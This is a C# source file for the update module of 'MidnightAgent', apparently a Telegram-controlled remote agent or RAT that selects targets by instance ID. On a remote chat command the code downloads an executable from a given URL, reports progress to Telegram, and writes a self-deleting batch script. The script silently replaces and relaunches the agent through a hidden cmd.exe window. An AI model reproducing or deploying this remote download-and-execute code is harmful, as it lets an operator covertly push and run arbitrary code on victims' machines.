using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using MidnightAgent.Core;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    public class UpdateFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "update";
        public string Description => "Update agent via URL";
        public string Usage => "/update <url> OR /update <id> <url>";

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                string url = "";
                if (args.Length == 1)
                {
                    if (!AgentState.IsActiveTarget) return FeatureResult.Ok(""); 
                    url = args[0];
                }
                else if (args.Length >= 2)
                {
                    if (args[0] != AgentState.InstanceId) return FeatureResult.Ok(""); 
                    url = args[1];
                }
                else return FeatureResult.Fail("Usage: /update <url> OR /update <id> <url>");

                return await PerformUpdate(url);
            }
            catch (Exception ex) { return FeatureResult.Fail($"Update Failed: {ex.Message}"); }
        }

        public async Task<FeatureResult> PerformUpdate(string url, string remoteVersion = null)
        {
            try
            {
                if (!Uri.IsWellFormedUriString(url, UriKind.Absolute)) return FeatureResult.Fail("Invalid URL format.");

                // Notify: Update found
                string versionInfo = !string.IsNullOrEmpty(remoteVersion) ? $" v{remoteVersion}" : "";
                TelegramInstance?.SendMessage($"🔍 <b>[{AgentState.InstanceId}]</b>\nNew update found{versionInfo}\n" +
                    $"Current: v{Config.Version}\n⬇️ Downloading...");

                string tempFile = Path.Combine(Path.GetTempPath(), $"update_{DateTime.Now.Ticks}.exe");
                using (var client = new WebClient()) { await client.DownloadFileTaskAsync(new Uri(url), tempFile); }

                // Notify: Download complete
                var fileInfo = new FileInfo(tempFile);
                TelegramInstance?.SendMessage($"✅ <b>[{AgentState.InstanceId}]</b>\nDownload complete!\n" +
                    $"📦 Size: {FormatFileSize(fileInfo.Length)}\n🔄 Applying update...");

                return ApplyUpdate(File.ReadAllBytes(tempFile));
            }
            catch (Exception ex)
            {
                TelegramInstance?.SendMessage($"❌ <b>[{AgentState.InstanceId}]</b>\nUpdate Failed: {ex.Message}");
                return FeatureResult.Fail($"Update Failed: {ex.Message}");
            }
        }

        public async Task<FeatureResult> PerformUpdateFromBytes(byte[] fileData, string remoteVersion)
        {
            try
            {
                TelegramInstance?.SendMessage($"🔍 <b>[{AgentState.InstanceId}]</b>\nNew update found v{remoteVersion}\n" +
                    $"Current: v{Config.Version}\n📦 Size: {FormatFileSize(fileData.Length)}\n🔄 Applying update...");
                return ApplyUpdate(fileData);
            }
            catch (Exception ex)
            {
                TelegramInstance?.SendMessage($"❌ <b>[{AgentState.InstanceId}]</b>\nUpdate Failed: {ex.Message}");
                return FeatureResult.Fail($"Update Failed: {ex.Message}");
            }
        }

        private FeatureResult ApplyUpdate(byte[] fileData)
        {
            try
            {
                string tempFolder = Path.Combine(Path.GetTempPath(), "MidnightUpdate");
                if (!Directory.Exists(tempFolder)) Directory.CreateDirectory(tempFolder);

                string tempPath = Path.Combine(tempFolder, "update_new.exe");
                File.WriteAllBytes(tempPath, fileData);

                string currentExe = Config.InstallPath ?? Process.GetCurrentProcess().MainModule.FileName;
                string updaterPath = Path.Combine(tempFolder, "updater.bat");
                
                string updaterScript = $@"@echo off
timeout /t 5 /nobreak > nul
if exist ""{currentExe}"" ( move /y ""{currentExe}"" ""{currentExe}.bak"" > nul )
copy /y ""{tempPath}"" ""{currentExe}"" > nul
if exist ""{currentExe}"" (
    start """" ""{currentExe}"" agent
    del /f /q ""{currentExe}.bak"" > nul
) else (
    move /y ""{currentExe}.bak"" ""{currentExe}"" > nul
    start """" ""{currentExe}""
)
del /f /q ""{tempPath}"" > nul
del /f /q ""%~f0"" > nul";

                File.WriteAllText(updaterPath, updaterScript);
                Process.Start(new ProcessStartInfo { FileName = "cmd.exe", Arguments = $"/c \"{updaterPath}\"", CreateNoWindow = true, UseShellExecute = false });
                Environment.Exit(0);
                return FeatureResult.Ok("🔄 Update initiating...");
            }
            catch (Exception ex) { return FeatureResult.Fail($"Apply failed: {ex.Message}"); }
        }

        private string FormatFileSize(long bytes)
        {
            string[] Suffix = { "B", "KB", "MB", "GB" };
            int i; double dblSByte = bytes;
            for (i = 0; i < Suffix.Length && dblSByte >= 1024; i++, dblSByte /= 1024) ;
            return string.Format("{0:0.##} {1}", dblSByte, Suffix[i]);
        }
        
        public Task<FeatureResult> ProcessFileUpdate(TelegramService telegram, string fileId, string fileName) => Task.FromResult(FeatureResult.Fail("Feature deprecated."));
    }
}
